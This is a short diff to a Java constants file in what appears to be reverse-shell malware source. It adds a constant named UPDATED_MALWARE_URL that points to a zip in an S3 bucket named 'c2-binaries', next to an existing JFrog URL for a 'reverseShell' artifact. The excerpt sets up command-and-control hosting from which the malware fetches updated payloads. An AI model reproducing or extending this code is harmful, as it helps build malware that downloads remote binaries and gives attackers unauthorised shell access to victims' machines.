@@ -24,6 +24,7 @@ public interface Constants {
     public static final String LOCK_FILE_NAME = "93803181808-lock";
 
     public static final String JFROG_BASE_URL= "https://mhattab.jfrog.io/artifactory/libs-release-local/com/mtattab/reverseshell/reverseShell/";
+    public static final String UPDATED_MALWARE_URL= "https://c2-binaries.s3.us-east-2.amazonaws.com/reverseShell-1.0.1-zip.zip";
 
     public static final String JFROG_META_DATA_FILE= "maven-metadata.xml";
 
